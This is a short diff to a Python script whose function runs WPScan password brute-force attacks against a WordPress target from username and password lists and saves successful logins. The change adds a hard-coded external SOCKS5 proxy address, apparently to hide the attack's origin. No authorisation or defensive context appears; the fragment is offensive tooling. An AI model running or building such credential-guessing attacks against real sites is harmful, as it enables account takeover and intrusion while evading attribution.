@@ -12,7 +12,8 @@ def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file)
         "--usernames", usernames_file,
         "--passwords", passwords_file,
         "--no-banner",
-        "--update"
+        "--update",
+        "--proxy", "socks5://35.180.42.196:1080"
     ]
     print(f"[*] Running WPScan: {' '.join(command)}")
     result = subprocess.run(command, capture_output=True, text=True)
